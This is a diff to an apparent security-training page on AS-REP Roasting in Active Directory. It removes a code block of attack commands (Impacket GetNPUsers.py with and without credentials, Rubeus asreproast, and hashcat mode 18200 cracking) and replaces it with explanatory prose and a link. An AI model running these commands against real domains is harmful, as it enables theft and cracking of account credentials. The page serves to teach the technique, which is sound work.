@@ -125,23 +125,14 @@
           pre-auth disabled, without ever authenticating to the domain.
         </p>
 
-        <pre><code># With credentials — enumerate then roast
-GetNPUsers.py corp.local/jdoe:Passw0rd -dc-ip 10.10.10.10 -request \
-  -outputfile asrep.hash
-
-# WITHOUT credentials — just a username list
-GetNPUsers.py corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt \
-  -no-pass -outputfile asrep.hash
-
-# Rubeus from a domain host
-Rubeus.exe asreproast /outfile:asrep.hash
-
-# Crack it
-hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt</code></pre>
-
         <p>
-          Hashcat mode <strong>18200</strong> is the AS-REP (Kerberos 5 AS-REP etype 23)
-          mode. As with Kerberoasting, RC4 material cracks fast.
+          The same tools that roast with a credential (Impacket's GetNPUsers, Rubeus) also
+          run in a <em>no-password</em> mode that takes only a username list — which is what
+          makes this a pre-authentication attack. The recovered AS-REP material is etype-23
+          (RC4) where possible and cracks fast, exactly as in Kerberoasting. The exploitation
+          walkthrough with commands is in the
+          <a href="../vulns.html">Vulns &amp; Misconfigs</a> section under
+          <em>AS-REP Roasting</em>.
         </p>
 
         <blockquote>
